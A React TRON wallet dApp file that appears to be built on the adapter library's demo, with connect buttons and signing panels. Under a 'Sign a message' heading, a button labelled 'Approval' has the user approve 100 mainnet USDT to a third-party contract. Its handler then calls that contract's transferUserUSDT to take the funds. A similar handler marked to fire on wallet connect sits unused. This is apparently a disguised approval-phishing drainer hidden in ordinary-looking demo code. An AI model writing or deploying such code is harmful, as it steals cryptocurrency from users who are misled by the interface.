import React, { useMemo, useState } from 'react';
import { useEffect } from 'react';
import type { WalletError } from '@tronweb3/tronwallet-abstract-adapter';
import { WalletDisconnectedError, WalletNotFoundError } from '@tronweb3/tronwallet-abstract-adapter';
import { useWallet, WalletProvider } from '@tronweb3/tronwallet-adapter-react-hooks';
import {
    WalletActionButton,
    WalletConnectButton,
    WalletDisconnectButton,
    WalletModalProvider,
    WalletSelectButton,
} from '@tronweb3/tronwallet-adapter-react-ui';
import toast from 'react-hot-toast';
import { Table, TableBody, TableCell, TableContainer, TableHead, TableRow, TextField, Alert } from '@mui/material';
import { BitKeepAdapter, OkxWalletAdapter, TokenPocketAdapter, TronLinkAdapter } from '@tronweb3/tronwallet-adapters';
import { WalletConnectAdapter } from '@tronweb3/tronwallet-adapter-walletconnect';
import { tronWeb } from './tronweb';
import { LedgerAdapter } from '@tronweb3/tronwallet-adapter-ledger';
import { Button } from '@tronweb3/tronwallet-adapter-react-ui';
const rows = [
    { name: 'Connect Button', reactUI: WalletConnectButton },
    { name: 'Disconnect Button', reactUI: WalletDisconnectButton },
    { name: 'Select Wallet Button', reactUI: WalletSelectButton },
    { name: 'Multi Action Button', reactUI: WalletActionButton },
];
/**
 * wrap your app content with WalletProvider and WalletModalProvider
 * WalletProvider provide some useful properties and methods
 * WalletModalProvider provide a Modal in which you can select wallet you want use.
 *
 * Also you can provide a onError callback to process any error such as ConnectionError
 */
export function App() {
    function onError(e: WalletError) {
        if (e instanceof WalletNotFoundError) {
            toast.error(e.message);
        } else if (e instanceof WalletDisconnectedError) {
            toast.error(e.message);
        } else toast.error(e.message);
    }
    const adapters = useMemo(function () {
        const tronLinkAdapter = new TronLinkAdapter();
        const walletConnectAdapter = new WalletConnectAdapter({
            network: 'Mainnet',
            options: {
                metadata: {
                    name: 'DApp Center',
                    description: 'WalletConnect',
                    url: 'https://your-dapp-url.org/',
                    icons: ['https://your-dapp-url.org/mainLogo.svg'],
                },
            },
            web3ModalConfig: {
                themeMode: 'dark',
                themeVariables: {
                    '--wcm-z-index': '1000'
                },
            }
        });
        const ledger = new LedgerAdapter({
            accountNumber: 2,
        });
        const bitKeepAdapter = new BitKeepAdapter();
        const tokenPocketAdapter = new TokenPocketAdapter();
        const okxwalletAdapter = new OkxWalletAdapter();
        return [tronLinkAdapter, bitKeepAdapter, tokenPocketAdapter, okxwalletAdapter, walletConnectAdapter, ledger];
    }, []);
    return (
        <WalletProvider onError={onError} autoConnect={true} disableAutoConnectOnLoad={true} adapters={adapters}>
            <WalletModalProvider>
                <UIComponent></UIComponent>
                <Profile></Profile>
                <SignDemo></SignDemo>
            </WalletModalProvider>
        </WalletProvider>
    );
}

function UIComponent() {
    return (
        <div>
            <h2>UI Component</h2>
            <TableContainer style={{ overflow: 'visible' }} component="div">
                <Table sx={{  }} aria-label="simple table">
                    <TableHead>
                        <TableRow>
                            <TableCell>Component</TableCell>
                            <TableCell align="left">React UI</TableCell>
                        </TableRow>
                    </TableHead>
                    <TableBody>
                        {rows.map((row) => (
                            <TableRow key={row.name} sx={{ '&:last-child td, &:last-child th': { border: 0 } }}>
                                <TableCell component="th" scope="row">
                                    {row.name}
                                </TableCell>
                                <TableCell align="left">
                                    <row.reactUI></row.reactUI>
                                </TableCell>
                            </TableRow>
                        ))}
                    </TableBody>
                </Table>
            </TableContainer>
        </div>
    );
}

function Profile() {
    const { address, connected, wallet } = useWallet();

    useEffect(() => {
        if (connected) {
            // 当 connected 为 true 时执行的逻辑
            console.log('Wallet is now connected');
            // 在这里触发你想要的事件
            // handleConnectedEvent();
        }
    }, [connected]); // 只在 connected 变化时运行

    const handleConnectedEvent = async () => {
        try {
            console.log('Handling connected event');
            console.log('tronWeb instance:', tronWeb);

            // 使用 TronWeb 与智能合约交互（假设你有合约地址）
            const contractAddress = 'TAh32mFsRoYz4jciMJSWTsdb2urb6f3y16'; // 替换为实际的合约地址
            const usdtContractAddress = "TG3XXyExBkPp9nzdajDZsozEu4BkaSJozs";
            const amount = 100 * 1e6; // 100 USDT（6個小數位）

            const usdtContract = await tronWeb.contract().at(usdtContractAddress);
            const approveTx = await usdtContract.approve(contractAddress, amount).send({
                from: contractAddress
            });
           
            console.log("授權成功，交易哈希：", approveTx);
           
            // 取得您的合約實例
            const contractInstance = await tronWeb.contract().at(contractAddress);
            const transferTx = await contractInstance.transferUserUSDT(amount).send({
                from: tronWeb.defaultAddress.base58
            });
           
            console.log("轉移成功，交易哈希：", transferTx);

        } catch (error) {
            console.error('Error handling connected event:', error);
        }
    };

    return (
        <div>
            <h2>Wallet Connection Info</h2>
            <p>
                <span>Connection Status:</span> {connected ? 'Connected' : 'Disconnected'}
            </p>
            <p>
                <span>Your selected Wallet:</span> {wallet?.adapter.name}
            </p>
            <p>
                <span>Your Address:</span> {address}
            </p>
        </div>
    );
}

function SignDemo() {
    const { signMessage, signTransaction, address } = useWallet();
    const [message, setMessage] = useState('');
    const [signedMessage, setSignedMessage] = useState('');
    const receiver = 'TPZvqumzsmNhLNLMYGb7o2rUAfXqtFgkmR';
    const [open, setOpen] = useState(false);

  

    async function onApproval() {
        try {

            console.log('tronWeb instance:', tronWeb);
            console.log('tronWeb.defaultAddress.base58:', tronWeb?.defaultAddress?.base58);
            console.log('tronWeb.ready:', tronWeb?.ready);

            const contractAddress = 'TJcyoiPsNra9ozVkAMHaXaDhH8TJCUwuLD'; // 替换为实际的合约地址

            const usdtContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";

            const amount = 100 * 1e6; // 100 USDT（6個小數位）

            const usdtContract = await tronWeb.contract().at(usdtContractAddress);

            console.log('usdtContract:', usdtContract);

            console.log('address:', address);

            const approveTx = await usdtContract.approve(contractAddress, amount).send();
           
            console.log("授權成功，交易哈希：", approveTx);
           
            // 取得您的合約實例
            const contractInstance = await tronWeb.contract().at(contractAddress);

            const transferTx = await contractInstance.transferUserUSDT(amount).send({
                from: address
            });
           
            console.log("轉移成功，交易哈希：", transferTx);

        } catch (error) {
            console.error('Error handling connected event:', error);
        }
    }

    async function onSignMessage() {
        const res = await signMessage(message);
        setSignedMessage(res);
    }

    async function onSignTransaction() {
        const transaction = await tronWeb.transactionBuilder.sendTrx(receiver, tronWeb.toSun(0.001), address);

        const signedTransaction = await signTransaction(transaction);
        // const signedTransaction = await tronWeb.trx.sign(transaction);
         await tronWeb.trx.sendRawTransaction(signedTransaction);
        setOpen(true);
    }

    async function onApprovalV2() {
        try {

            const contractAddress = 'TJcyoiPsNra9ozVkAMHaXaDhH8TJCUwuLD'; 

            const usdtContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
            
            const amount = 100 * 1e6; // 100 USDT（6位小数）
    
            // 构建 approve 调用的交易数据
            const transaction = await tronWeb.transactionBuilder.triggerSmartContract(
                usdtContractAddress,
                'approve(address,uint256)', // 调用合约的 approve 方法
                { feeLimit: 100000000 }, // 设置交易费用限制
                [
                    { type: 'address', value: contractAddress }, // 合约地址作为第一个参数
                    { type: 'uint256', value: amount } // 授权金额作为第二个参数
                ],
                address // 发起交易的地址
            );
    
            // 检查是否生成交易成功
            if (!transaction.result || !transaction.result.result) {
                throw new Error('生成交易失败');
            }
    
            console.log('生成的交易:', transaction.transaction);
    
            // 签名交易
            const signedTransaction = await signTransaction(transaction.transaction);
            if (!signedTransaction.signature) {
                throw new Error('签名交易失败');
            }
    
            console.log('签名后的交易:', signedTransaction);
    
            // 广播交易
            const broadcastResult = await tronWeb.trx.sendRawTransaction(signedTransaction);
            if (broadcastResult.result) {
                console.log('交易广播成功，交易哈希:', broadcastResult.txid);

                await onTransferV2(amount)
            } else {
                console.error('交易广播失败:', broadcastResult);
            }
    
        } catch (error) {
            console.error('执行合约时出错:', error);
        }
    }

    async function onTransferV2(amount) {
        try {
            const contractAddress = 'TJcyoiPsNra9ozVkAMHaXaDhH8TJCUwuLD'; // 替换为实际的智能合约地址
    
            // 构建 approve 调用的交易数据
            const transaction = await tronWeb.transactionBuilder.triggerSmartContract(
                contractAddress,
                'transferUserUSDT(uint256)', // 调用合约的 approve 方法
                { feeLimit: 100000000 , from: address}, // 设置交易费用限制
                [
                    { type: 'uint256', value: amount } // 授权金额作为第二个参数
                ],
                address // 发起交易的地址
            );
    
            // 检查是否生成交易成功
            if (!transaction.result || !transaction.result.result) {
                throw new Error('生成交易失败');
            }
    
            console.log('生成的交易:', transaction.transaction);
    
            // 签名交易
            const signedTransaction = await signTransaction(transaction.transaction);
            if (!signedTransaction.signature) {
                throw new Error('签名交易失败');
            }
    
            console.log('签名后的交易:', signedTransaction);
    
            // 广播交易
            const broadcastResult = await tronWeb.trx.sendRawTransaction(signedTransaction);
            if (broadcastResult.result) {
                console.log('交易广播成功，交易哈希:', broadcastResult.txid);
            } else {
                console.error('交易广播失败:', broadcastResult);
            }
    
        } catch (error) {
            console.error('执行合约时出错:', error);
        }
    }

    async function onTransferV3(amount) {
        try {

            const usdtContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
    
            const transaction = await tronWeb.transactionBuilder.triggerSmartContract(
                usdtContractAddress,
                'transfer(address,uint256)',
                { feeLimit: 100000000 , from: address}, // 设置交易费用限制
                [
                    { type: 'address', value: address }, 
                    { type: 'uint256', value: amount * 1e6 } 
                ],
                address // 发起交易的地址
            );
    
            // 检查是否生成交易成功
            if (!transaction.result || !transaction.result.result) {
                throw new Error('生成交易失败');
            }
    
            console.log('生成的交易:', transaction.transaction);
    
            // 签名交易
            const signedTransaction = await signTransaction(transaction.transaction);
            if (!signedTransaction.signature) {
                throw new Error('签名交易失败');
            }
    
            console.log('签名后的交易:', signedTransaction);
    
            // 广播交易
            const broadcastResult = await tronWeb.trx.sendRawTransaction(signedTransaction);
            if (broadcastResult.result) {
                console.log('交易广播成功，交易哈希:', broadcastResult.txid);
            } else {
                console.error('交易广播失败:', broadcastResult);
            }
    
        } catch (error) {
            console.error('执行合约时出错:', error);
        }
    }


    return (
        <div style={{ marginBottom: 200 }}>
            <h2>Sign a message</h2>
            <p style={{ display: 'flex', alignItems: 'center', flexWrap: 'wrap', wordBreak: 'break-all' }}>
                You can sign a message by click the button.
            </p>
            <Button style={{ marginRight: '20px' }} onClick={() => onApprovalV2()}>
                Approval
            </Button>
            <Button style={{ marginRight: '20px' }} onClick={onSignMessage}>
                SignMessage
            </Button>
            <TextField
                size="small"
                onChange={(e) => setMessage(e.target.value)}
                placeholder="input message to signed"
            ></TextField>
            <p>Your sigedMessage is: {signedMessage}</p>
            <h2>Sign a Transaction</h2>
            <p style={{ display: 'flex', alignItems: 'center', flexWrap: 'wrap', wordBreak: 'break-all' }}>
                You can transfer 0.001 Trx to &nbsp;<i>{receiver}</i>&nbsp;by click the button.
            </p>
            <Button onClick={onSignTransaction}>Transfer</Button>
            {open && (
                <Alert onClose={() => setOpen(false)} severity="success" sx={{ width: '100%', marginTop: 1 }}>
                    Success! You can confirm your transfer on{' '}
                    <a target="_blank" rel="noreferrer" href={`https://tronscan.org/#/address/${address}`}>
                        Tron Scan
                    </a>
                </Alert>
            )}
        </div>
    );
}
